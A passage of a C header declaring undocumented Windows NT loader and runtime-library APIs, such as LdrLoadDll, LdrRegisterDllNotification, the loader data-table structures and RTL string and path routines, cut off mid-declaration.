#endif /* NTOS_ENABLE_LIST_ENTRY_MACRO */

/*
** List Entry macro END
*/

/*
**  LDR START
*/

#define LDR_DLL_NOTIFICATION_REASON_LOADED   1
#define LDR_DLL_NOTIFICATION_REASON_UNLOADED 2

typedef enum _LDR_DLL_LOAD_REASON {
    LoadReasonStaticDependency = 0,
    LoadReasonStaticForwarderDependency,
    LoadReasonDynamicForwarderDependency,
    LoadReasonDelayloadDependency,
    LoadReasonDynamicLoad,
    LoadReasonAsImageLoad,
    LoadReasonAsDataLoad,
    LoadReasonEnclavePrimary,
    LoadReasonEnclaveDependency,
    LoadReasonPatchImage,
    LoadReasonUnknown = -1
} LDR_DLL_LOAD_REASON, * PLDR_DLL_LOAD_REASON;

//
// Dll Characteristics for LdrLoadDll
//
#define LDR_IGNORE_CODE_AUTHZ_LEVEL                 0x00001000

//
// LdrAddRef Flags
//
#define LDR_ADDREF_DLL_PIN                          0x00000001

//
// LdrLockLoaderLock Flags
//
#define LDR_LOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS   0x00000001
#define LDR_LOCK_LOADER_LOCK_FLAG_TRY_ONLY          0x00000002

//
// LdrUnlockLoaderLock Flags
//
#define LDR_UNLOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS 0x00000001

//
// LdrGetDllHandleEx Flags
//
#define LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT    0x00000001
#define LDR_GET_DLL_HANDLE_EX_PIN                   0x00000002

//
// LdrGetProcedureAddressEx Flags
//
#define LDR_GET_PROCEDURE_ADDRESS_DONT_RECORD_FORWARDER 0x00000001

#define RESOURCE_TYPE_LEVEL     0
#define RESOURCE_NAME_LEVEL     1
#define RESOURCE_LANGUAGE_LEVEL 2
#define RESOURCE_DATA_LEVEL     3

typedef struct _LDR_RESOURCE_INFO {
    ULONG_PTR Type;
    ULONG_PTR Name;
    ULONG Lang;
} LDR_RESOURCE_INFO, * PLDR_RESOURCE_INFO;

typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    } DUMMYUNION0;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1; // Size=4 Offset=104 BitOffset=0 BitCount=1
            ULONG MarkedForRemoval : 1; // Size=4 Offset=104 BitOffset=1 BitCount=1
            ULONG ImageDll : 1; // Size=4 Offset=104 BitOffset=2 BitCount=1
            ULONG LoadNotificationsSent : 1; // Size=4 Offset=104 BitOffset=3 BitCount=1
            ULONG TelemetryEntryProcessed : 1; // Size=4 Offset=104 BitOffset=4 BitCount=1
            ULONG ProcessStaticImport : 1; // Size=4 Offset=104 BitOffset=5 BitCount=1
            ULONG InLegacyLists : 1; // Size=4 Offset=104 BitOffset=6 BitCount=1
            ULONG InIndexes : 1; // Size=4 Offset=104 BitOffset=7 BitCount=1
            ULONG ShimDll : 1; // Size=4 Offset=104 BitOffset=8 BitCount=1
            ULONG InExceptionTable : 1; // Size=4 Offset=104 BitOffset=9 BitCount=1
            ULONG ReservedFlags1 : 2; // Size=4 Offset=104 BitOffset=10 BitCount=2
            ULONG LoadInProgress : 1; // Size=4 Offset=104 BitOffset=12 BitCount=1
            ULONG LoadConfigProcessed : 1; // Size=4 Offset=104 BitOffset=13 BitCount=1
            ULONG EntryProcessed : 1; // Size=4 Offset=104 BitOffset=14 BitCount=1
            ULONG ProtectDelayLoad : 1; // Size=4 Offset=104 BitOffset=15 BitCount=1
            ULONG ReservedFlags3 : 2; // Size=4 Offset=104 BitOffset=16 BitCount=2
            ULONG DontCallForThreads : 1; // Size=4 Offset=104 BitOffset=18 BitCount=1
            ULONG ProcessAttachCalled : 1; // Size=4 Offset=104 BitOffset=19 BitCount=1
            ULONG ProcessAttachFailed : 1; // Size=4 Offset=104 BitOffset=20 BitCount=1
            ULONG CorDeferredValidate : 1; // Size=4 Offset=104 BitOffset=21 BitCount=1
            ULONG CorImage : 1; // Size=4 Offset=104 BitOffset=22 BitCount=1
            ULONG DontRelocate : 1; // Size=4 Offset=104 BitOffset=23 BitCount=1
            ULONG CorILOnly : 1; // Size=4 Offset=104 BitOffset=24 BitCount=1
            ULONG ChpeImage : 1; // Size=4 Offset=104 BitOffset=25 BitCount=1
            ULONG ReservedFlags5 : 2; // Size=4 Offset=104 BitOffset=26 BitCount=2
            ULONG Redirected : 1; // Size=4 Offset=104 BitOffset=28 BitCount=1
            ULONG ReservedFlags6 : 2; // Size=4 Offset=104 BitOffset=29 BitCount=2
            ULONG CompatDatabaseProcessed : 1; // Size=4 Offset=104 BitOffset=31 BitCount=1
        };
    } ENTRYFLAGSUNION;
    WORD ObsoleteLoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    } DUMMYUNION1;
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    } DUMMYUNION2;
    //fields below removed for compatibility, if you need them use LDR_DATA_TABLE_ENTRY_FULL
} LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE* PLDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY* PCLDR_DATA_TABLE_ENTRY;

typedef BOOLEAN(NTAPI* PLDR_INIT_ROUTINE)(
    _In_ PVOID DllHandle,
    _In_ ULONG Reason,
    _In_opt_ PVOID Context
    );

typedef struct _LDR_SERVICE_TAG_RECORD
{
    struct _LDR_SERVICE_TAG_RECORD* Next;
    ULONG ServiceTag;
} LDR_SERVICE_TAG_RECORD, * PLDR_SERVICE_TAG_RECORD;

typedef struct _LDRP_CSLIST
{
    PSINGLE_LIST_ENTRY Tail;
} LDRP_CSLIST, * PLDRP_CSLIST;

typedef enum _LDR_DDAG_STATE
{
    LdrModulesMerged = -5,
    LdrModulesInitError = -4,
    LdrModulesSnapError = -3,
    LdrModulesUnloaded = -2,
    LdrModulesUnloading = -1,
    LdrModulesPlaceHolder = 0,
    LdrModulesMapping = 1,
    LdrModulesMapped = 2,
    LdrModulesWaitingForDependencies = 3,
    LdrModulesSnapping = 4,
    LdrModulesSnapped = 5,
    LdrModulesCondensed = 6,
    LdrModulesReadyToInit = 7,
    LdrModulesInitializing = 8,
    LdrModulesReadyToRun = 9
} LDR_DDAG_STATE;

typedef struct _LDR_DDAG_NODE
{
    LIST_ENTRY Modules;
    PLDR_SERVICE_TAG_RECORD ServiceTagList;
    ULONG LoadCount;
    ULONG LoadWhileUnloadingCount;
    ULONG LowestLink;
    union
    {
        LDRP_CSLIST Dependencies;
        SINGLE_LIST_ENTRY RemovalLink;
    };
    LDRP_CSLIST IncomingDependencies;
    LDR_DDAG_STATE State;
    SINGLE_LIST_ENTRY CondenseLink;
    ULONG PreorderNumber;
} LDR_DDAG_NODE, * PLDR_DDAG_NODE;

typedef enum _LDR_HOT_PATCH_STATE
{
    LdrHotPatchBaseImage = 0,
    LdrHotPatchNotApplied = 1,
    LdrHotPatchAppliedReverse = 2,
    LdrHotPatchAppliedForward = 3,
    LdrHotPatchFailedToPatch = 4,
    LdrHotPatchStateMax = 5,
} LDR_HOT_PATCH_STATE, * PLDR_HOT_PATCH_STATE;

//
// Full declaration of LDR_DATA_TABLE_ENTRY
//
typedef struct _LDR_DATA_TABLE_ENTRY_FULL
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    };
    PVOID DllBase;
    PLDR_INIT_ROUTINE EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        UCHAR FlagGroup[4];
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1;
            ULONG MarkedForRemoval : 1;
            ULONG ImageDll : 1;
            ULONG LoadNotificationsSent : 1;
            ULONG TelemetryEntryProcessed : 1;
            ULONG ProcessStaticImport : 1;
            ULONG InLegacyLists : 1;
            ULONG InIndexes : 1;
            ULONG ShimDll : 1;
            ULONG InExceptionTable : 1;
            ULONG ReservedFlags1 : 2;
            ULONG LoadInProgress : 1;
            ULONG LoadConfigProcessed : 1;
            ULONG EntryProcessed : 1;
            ULONG ProtectDelayLoad : 1;
            ULONG ReservedFlags3 : 2;
            ULONG DontCallForThreads : 1;
            ULONG ProcessAttachCalled : 1;
            ULONG ProcessAttachFailed : 1;
            ULONG CorDeferredValidate : 1;
            ULONG CorImage : 1;
            ULONG DontRelocate : 1;
            ULONG CorILOnly : 1;
            ULONG ChpeImage : 1;
            ULONG ChpeEmulatorImage : 1;
            ULONG ReservedFlags5 : 1;
            ULONG Redirected : 1;
            ULONG ReservedFlags6 : 2;
            ULONG CompatDatabaseProcessed : 1;
        };
    };
    USHORT ObsoleteLoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
    PACTIVATION_CONTEXT EntryPointActivationContext;
    PVOID Lock;
    PLDR_DDAG_NODE DdagNode;
    LIST_ENTRY NodeModuleLink;
    PVOID LoadContext;
    PVOID ParentDllBase;
    PVOID SwitchBackContext;
    RTL_BALANCED_NODE BaseAddressIndexNode;
    RTL_BALANCED_NODE MappingInfoIndexNode;
    ULONG_PTR OriginalBase;
    LARGE_INTEGER LoadTime;
    ULONG BaseNameHashValue;
    LDR_DLL_LOAD_REASON LoadReason;
    ULONG ImplicitPathOptions;
    ULONG ReferenceCount;
    ULONG DependentLoadFlags;
    UCHAR SigningLevel;
    ULONG CheckSum; 
    PVOID ActivePatchImageBase;
    LDR_HOT_PATCH_STATE HotPatchState;
} LDR_DATA_TABLE_ENTRY_FULL, * PLDR_DATA_TABLE_ENTRY_FULL;

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG Flags;                    //Reserved.
    PCUNICODE_STRING FullDllName;   //The full path name of the DLL module.
    PCUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
    PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
    ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_LOADED_NOTIFICATION_DATA, * PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA {
    ULONG Flags;                    //Reserved.
    PCUNICODE_STRING FullDllName;   //The full path name of the DLL module.
    PCUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
    PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
    ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, * PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, * PLDR_DLL_NOTIFICATION_DATA;
typedef const LDR_DLL_NOTIFICATION_DATA* PCLDR_DLL_NOTIFICATION_DATA;

typedef VOID(NTAPI *PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)(
    _In_    PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_    PVOID Context,
    _Inout_ BOOLEAN *StopEnumeration
    );

typedef VOID(CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    _In_ ULONG NotificationReason,
    _In_ PCLDR_DLL_NOTIFICATION_DATA NotificationData,
    _In_opt_ PVOID Context);

#ifndef LDR_IS_DATAFILE
#define LDR_IS_DATAFILE(DllHandle) (((ULONG_PTR)(DllHandle)) & (ULONG_PTR)1)
#endif

#ifndef LDR_IS_IMAGEMAPPING
#define LDR_IS_IMAGEMAPPING(DllHandle) (((ULONG_PTR)(DllHandle)) & (ULONG_PTR)2)
#endif

#ifndef LDR_IS_RESOURCE
#define LDR_IS_RESOURCE(DllHandle) (LDR_IS_IMAGEMAPPING(DllHandle) || LDR_IS_DATAFILE(DllHandle))
#endif

#ifndef IMAGE_FILE_MACHINE_CHPE_X86
#define IMAGE_FILE_MACHINE_CHPE_X86 0x3A64
#endif

#ifndef IMAGE_FILE_MACHINE_ARM64EC
#define IMAGE_FILE_MACHINE_ARM64EC           0xA641
#endif

#ifndef IMAGE_FILE_MACHINE_ARM64X
#define IMAGE_FILE_MACHINE_ARM64X            0xA64E
#endif

NTSYSAPI
NTSTATUS
NTAPI
LdrAccessResource(
    _In_ PVOID DllHandle,
    _In_ CONST IMAGE_RESOURCE_DATA_ENTRY* ResourceDataEntry,
    _Out_opt_ PVOID *Address,
    _Out_opt_ PULONG Size);

NTSYSAPI
NTSTATUS
NTAPI
LdrAddRefDll(
    _In_ ULONG Flags,
    _In_ PVOID DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrEnumerateLoadedModules(
    _In_ ULONG Flags,
    _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction,
    _In_opt_ PVOID Context);

NTSYSAPI
NTSTATUS
NTAPI
LdrFindResource_U(
    _In_ PVOID DllHandle,
    _In_ CONST ULONG_PTR* ResourceIdPath,
    _In_ ULONG ResourceIdPathLength,
    _Out_ PIMAGE_RESOURCE_DATA_ENTRY *ResourceDataEntry);

NTSYSAPI
NTSTATUS
NTAPI
LdrFindResourceEx_U(
    _In_ ULONG Flags,
    _In_ PVOID DllHandle,
    _In_ PLDR_RESOURCE_INFO ResourceInfo,
    _In_ ULONG Level,
    _Out_ PIMAGE_RESOURCE_DATA_ENTRY* ResourceDataEntry);

NTSYSAPI
NTSTATUS
NTAPI
LdrFindResourceDirectory_U(
    _In_ PVOID DllHandle,
    _In_ PLDR_RESOURCE_INFO ResourceInfo,
    _In_ ULONG Level,
    _Out_ PIMAGE_RESOURCE_DIRECTORY *ResourceDirectory);

NTSYSAPI
NTSTATUS
NTAPI
LdrFindEntryForAddress(
    _In_ PVOID Address,
    _Out_ PLDR_DATA_TABLE_ENTRY *TableEntry);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandle(
    _In_opt_ PCWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_ PCUNICODE_STRING DllName,
    _Out_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandleEx(
    _In_ ULONG Flags,
    _In_opt_ PWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_ PUNICODE_STRING DllName,
    _Out_opt_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandleByMapping(
    _In_ PVOID BaseAddress,
    _Out_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandleByName(
    _In_opt_ PUNICODE_STRING BaseDllName,
    _In_opt_ PUNICODE_STRING FullDllName,
    _Out_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllFullName(
    _In_ PVOID DllHandle,
    _Out_ PUNICODE_STRING FullDllName);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllDirectory(
    _Out_ PUNICODE_STRING DllDirectory);

NTSYSAPI
NTSTATUS
NTAPI
LdrSetDllDirectory(
    _In_ PUNICODE_STRING DllDirectory);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetProcedureAddress(
    _In_ PVOID DllHandle,
    _In_opt_ CONST ANSI_STRING* ProcedureName,
    _In_opt_ ULONG ProcedureNumber,
    _Out_ PVOID *ProcedureAddress);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetProcedureAddressForCaller(
    _In_ PVOID DllHandle,
    _In_opt_ PANSI_STRING ProcedureName,
    _In_opt_ ULONG ProcedureNumber,
    _Out_ PVOID *ProcedureAddress,
    _In_ ULONG Flags,
    _In_ PVOID *Callback);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetProcedureAddressEx(
    _In_ PVOID DllHandle,
    _In_opt_ PANSI_STRING ProcedureName,
    _In_opt_ ULONG ProcedureNumber,
    _Out_ PVOID* ProcedureAddress,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetKnownDllSectionHandle(
    _In_ PCWSTR DllName,
    _In_ BOOLEAN KnownDlls32,
    _Out_ PHANDLE Section);

NTSYSAPI
NTSTATUS
NTAPI
LdrLoadDll(
    _In_opt_ PCWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_  PCUNICODE_STRING DllName,
    _Out_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrUnloadDll(
    _In_ PVOID DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrQueryProcessModuleInformation(
    _Out_ PRTL_PROCESS_MODULES ModuleInformation,
    _In_ ULONG ModuleInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
LdrRegisterDllNotification(
    _In_ ULONG Flags,
    _In_ PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    _In_opt_ PVOID Context,
    _Out_ PVOID *Cookie);

NTSYSAPI
NTSTATUS
NTAPI
LdrUnregisterDllNotification(
    _In_ PVOID Cookie);

NTSYSAPI
NTSTATUS
NTAPI
LdrResSearchResource(
    _In_ PVOID File,
    _In_ CONST ULONG_PTR* ResIds,
    _In_ ULONG ResIdCount,
    _In_ ULONG Flags,
    _Out_ LPVOID *Resource,
    _Out_ ULONG_PTR *Size,
    _In_opt_ USHORT *FoundLanguage,
    _In_opt_ ULONG *FoundLanguageLength);

NTSYSAPI
NTSTATUS
NTAPI
LdrOpenImageFileOptionsKey(
    _In_ PCUNICODE_STRING ImagePathName,
    _In_ BOOLEAN Wow64Path,
    _Out_ PHANDLE KeyHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrQueryImageFileExecutionOptions(
    _In_ PCUNICODE_STRING ImagePathName,
    _In_ PCWSTR OptionName,
    _In_ ULONG Type,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG ResultSize);

NTSYSAPI
BOOLEAN
NTAPI
LdrIsModuleSxsRedirected( //LdrEntry->Flags->Redirected
    _In_ PVOID DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrQueryImageFileExecutionOptionsEx(
    _In_ PCUNICODE_STRING ImagePathName,
    _In_ PCWSTR OptionName,
    _In_ ULONG Type,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG ResultSize,
    _In_ BOOLEAN Wow64Path);

NTSYSAPI
NTSTATUS
NTAPI
LdrQueryImageFileKeyOption(
    _In_ HANDLE KeyHandle,
    _In_ PCWSTR OptionName,
    _In_ ULONG Type,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG ResultSize);

NTSYSAPI
NTSTATUS
NTAPI
LdrDisableThreadCalloutsForDll(
    _In_ PVOID DllImageBase);

#define LDR_LOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS           0x00000001
#define LDR_LOCK_LOADER_LOCK_FLAG_TRY_ONLY                  0x00000002

#define LDR_LOCK_LOADER_LOCK_DISPOSITION_INVALID            0x00000000
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_ACQUIRED      0x00000001
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_NOT_ACQUIRED  0x00000002

#define LDR_UNLOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS         0x00000001

NTSYSAPI
NTSTATUS
NTAPI
LdrLockLoaderLock(
    _In_ ULONG Flags,
    _Out_opt_ ULONG *Disposition,
    _Out_ PVOID *Cookie);

NTSYSAPI
NTSTATUS
NTAPI
LdrUnlockLoaderLock(
    _In_ ULONG Flags,
    _Inout_ PVOID Cookie);

NTSYSAPI
NTSTATUS
NTAPI
LdrRelocateImage(
    _In_ PVOID NewBase,
    _In_opt_ PSTR LoaderName,
    _In_ NTSTATUS Success,
    _In_ NTSTATUS Conflict,
    _In_ NTSTATUS Invalid);

NTSYSAPI
PIMAGE_BASE_RELOCATION
NTAPI
LdrProcessRelocationBlock(
    _In_ ULONG_PTR VA,
    _In_ ULONG SizeOfBlock,
    _In_ PUSHORT NextOffset,
    _In_ LONG_PTR Diff);

DECLSPEC_NORETURN
NTSYSAPI
VOID
NTAPI
LdrShutdownProcess(
    VOID);

DECLSPEC_NORETURN
NTSYSAPI
VOID
NTAPI
LdrShutdownThread(
    VOID);

NTSYSAPI
BOOLEAN
NTAPI
LdrControlFlowGuardEnforced(
    VOID);

/*
**  LDR END
*/

/*
** Runtime Library API START
*/

/************************************************************************************
*
* CSR API.
*
************************************************************************************/

NTSYSAPI
ULONG
NTAPI
CsrGetProcessId(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
CsrClientConnectToServer(
    _In_ PWSTR ObjectDirectory,
    _In_ ULONG ServerDllIndex,
    _Inout_ PVOID ConnectionInformation,
    _Inout_ ULONG *ConnectionInformationLength,
    _Out_ PBOOLEAN CalledFromServer);

/************************************************************************************
*
* RTL Strings API.
*
************************************************************************************/

#define RTL_DUPLICATE_UNICODE_STRING_NULL_TERMINATE (0x00000001)
#define RTL_DUPLICATE_UNICODE_STRING_ALLOCATE_NULL_STRING (0x00000002)

#ifndef RtlInitEmptyUnicodeString
#define RtlInitEmptyUnicodeString(_ucStr,_buf,_bufSize) \
    ((_ucStr)->Buffer = (_buf), \
     (_ucStr)->Length = 0, \
     (_ucStr)->MaximumLength = (USHORT)(_bufSize))
#endif

FORCEINLINE
VOID
NTAPI
RtlInitEmptyAnsiString(
    _Out_ PANSI_STRING AnsiString,
    _Pre_maybenull_ _Pre_readable_size_(MaximumLength) PCHAR Buffer,
    _In_ USHORT MaximumLength
)
{
    memset(AnsiString, 0, sizeof(ANSI_STRING));
    AnsiString->MaximumLength = MaximumLength;
    AnsiString->Buffer = Buffer;
}

NTSYSAPI
BOOLEAN
NTAPI
RtlCreateUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_ PCWSTR SourceString);

NTSYSAPI
BOOLEAN
NTAPI
RtlCreateUnicodeStringFromAsciiz(
    _Out_ PUNICODE_STRING DestinationString,
    _In_ PSTR SourceString);

NTSYSAPI
VOID
NTAPI
RtlInitString(
    _Out_ PSTRING DestinationString,
    _In_opt_ PCSZ SourceString);

NTSYSAPI
VOID
NTAPI
RtlInitUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitUnicodeStringEx(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualUnicodeString(
    _In_ PCUNICODE_STRING String1,
    _In_ PCUNICODE_STRING String2,
    _In_ BOOLEAN CaseInSensitive);

NTSYSAPI
NTSTATUS
NTAPI
RtlDuplicateUnicodeString(
    _In_ ULONG Flags,
    _In_ PUNICODE_STRING StringIn,
    _Out_ PUNICODE_STRING StringOut);

NTSYSAPI
WCHAR
NTAPI
RtlUpcaseUnicodeChar(
    _In_ WCHAR SourceCharacter);

NTSYSAPI
WCHAR
NTAPI
RtlDowncaseUnicodeChar(
    _In_ WCHAR SourceCharacter);

NTSYSAPI
BOOLEAN
NTAPI
RtlIsNameInExpression(
    _In_ PUNICODE_STRING Expression,
    _In_ PUNICODE_STRING Name,
    _In_ BOOLEAN IgnoreCase,
    _In_opt_ PWCH UpcaseTable);

NTSYSAPI
NTSTATUS
NTAPI
RtlStringFromGUID(
    _In_ GUID *Guid,
    _Out_ PUNICODE_STRING GuidString);

NTSYSAPI
NTSTATUS
NTAPI
RtlGUIDFromString(
    _In_ PUNICODE_STRING GuidString,
    _Out_ GUID *Guid);

NTSYSAPI
BOOLEAN
NTAPI
RtlPrefixUnicodeString(
    _In_ PCUNICODE_STRING String1,
    _In_ PCUNICODE_STRING String2,
    _In_ BOOLEAN CaseInSensitive);

NTSYSAPI
NTSTATUS
NTAPI
RtlFormatCurrentUserKeyPath(
    _Out_ PUNICODE_STRING CurrentUserKeyPath);

NTSYSAPI
VOID
NTAPI
RtlFreeUnicodeString(
    _In_ PUNICODE_STRING UnicodeString);

NTSYSAPI
VOID
NTAPI
RtlEraseUnicodeString(
    _Inout_ PUNICODE_STRING String);

NTSYSAPI
VOID
NTAPI
RtlFreeAnsiString(
    _In_ PANSI_STRING AnsiString);

NTSYSAPI
NTSTATUS
NTAPI
RtlAnsiStringToUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_ PCANSI_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeStringToAnsiString(
    _Inout_ PANSI_STRING DestinationString,
    _In_ PUNICODE_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

NTSYSAPI
WCHAR
NTAPI
RtlAnsiCharToUnicodeChar(
    _Inout_ PUCHAR *SourceCharacter);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeToMultiByteSize(
    _Out_ PULONG BytesInMultiByteString,
    _In_reads_bytes_(BytesInUnicodeString) PWCH UnicodeString,
    _In_ ULONG BytesInUnicodeString);

NTSYSAPI
BOOLEAN
NTAPI
RtlDosPathNameToNtPathName_U(
    _In_ PCWSTR DosFileName,
    _Out_ PUNICODE_STRING NtFileName,
    _Out_opt_ PWSTR *FilePart,
    _Reserved_ PVOID Reserved);

NTSYSAPI
LONG
NTAPI
RtlCompareUnicodeStrings(
    _In_reads_(String1Length) PWCHAR String1,
    _In_ SIZE_T String1Length,
    _In_reads_(String2Length) PWCHAR String2,
    _In_ SIZE_T String2Length,
    _In_ BOOLEAN CaseInSensitive);

NTSYSAPI
VOID
NTAPI
RtlCopyString(
    _In_ PSTRING DestinationString,
    _In_opt_ PSTRING SourceString);

NTSYSAPI
CHAR
NTAPI
RtlUpperChar(
    _In_ CHAR Character);

NTSYSAPI
VOID
NTAPI
RtlUpperString(
    _In_ PSTRING DestinationString,
    _In_ PSTRING SourceString);

NTSYSAPI
LONG
NTAPI
RtlCompareAltitudes(
    _In_ PCUNICODE_STRING Altitude1,
    _In_ PCUNICODE_STRING Altitude2);

//
// preallocated heap-growable buffers
//
typedef struct _RTL_BUFFER {
    PUCHAR    Buffer;
    PUCHAR    StaticBuffer;
    SIZE_T    Size;
    SIZE_T    StaticSize;
    SIZE_T    ReservedForAllocatedSize; // for future doubling
    PVOID     ReservedForIMalloc; // for future pluggable growth
} RTL_BUFFER, *PRTL_BUFFER;

typedef struct _RTL_UNICODE_STRING_BUFFER {
    UNICODE_STRING String;
    RTL_BUFFER     ByteBuffer;
    UCHAR          MinimumStaticBufferForTerminalNul[sizeof(WCHAR)];
} RTL_UNICODE_STRING_BUFFER, *PRTL_UNICODE_STRING_BUFFER;

//
// These are OUT Disposition values.
//
#define RTL_NT_PATH_NAME_TO_DOS_PATH_NAME_AMBIGUOUS   (0x00000001)
#define RTL_NT_PATH_NAME_TO_DOS_PATH_NAME_UNC         (0x00000002)
#define RTL_NT_PATH_NAME_TO_DOS_PATH_NAME_DRIVE       (0x00000003)
#define RTL_NT_PATH_NAME_TO_DOS_PATH_NAME_ALREADY_DOS (0x00000004)

NTSYSAPI
NTSTATUS
NTAPI
RtlNtPathNameToDosPathName(
    _In_ ULONG Flags,
    _Inout_ PRTL_UNICODE_STRING_BUFFER Path,
    _Out_opt_ PULONG Disposition,
    _Inout_opt_ PWSTR* FilePart);

NTSYSAPI
ULONG
NTAPI
RtlIsDosDeviceName_U(
    _In_ PCWSTR DosFileName);

NTSYSAPI
ULONG
NTAPI
RtlGetFullPathName_U(
    _In_ PCWSTR lpFileName,
    _In_ ULONG nBufferLength,
    _Out_writes_bytes_(nBufferLength) PWSTR lpBuffer,
    _Out_opt_ PWSTR *lpFilePart);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetSearchPath(
    _Out_ PWSTR *SearchPath);

typedef enum _RTL_PATH_TYPE {
    RtlPathTypeUnknown,         // 0
    RtlPathTypeUncAbsolute,     // 1
    RtlPathTypeDriveAbsolute,   // 2
    RtlPathTypeDriveRelative,   // 3
    RtlPathTypeRooted,          // 4
    RtlPathTypeRelative,        // 5
    RtlPathTypeLocalDevice,     // 6
    RtlPathTypeRootLocalDevice  // 7
} RTL_PATH_TYPE;

NTSYSAPI
RTL_PATH_TYPE
NTAPI
RtlDetermineDosPathNameType_U(
    _In_ PCWSTR DosFileName);

#define HASH_STRING_ALGORITHM_DEFAULT   (0)
#define HASH_STRING_ALGORITHM_X65599    (1)
#define HASH_STRING_ALGORITHM_INVALID   (0xffffffff)

NTSYSAPI
NTSTATUS
NTAPI
RtlHashUnicodeString(
    _In_ const UNICODE_STRING *String,
    _In_ BOOLEAN CaseInSensitive,
    _In_ ULONG HashAlgorithm,
    _Out_ PULONG HashValue);

NTSYSAPI
NTSTATUS
NTAPI
RtlAppendUnicodeStringToString(
    _In_ PUNICODE_STRING Destination,
    _In_ PUNICODE_STRING Source);

NTSYSAPI
NTSTATUS
NTAPI
RtlAppendUnicodeToString(
    _In_ PUNICODE_STRING Destination,
    _In_opt_ PWSTR Source);

NTSYSAPI
VOID
NTAPI
RtlCopyUnicodeString(
    _In_ PUNICODE_STRING DestinationString,
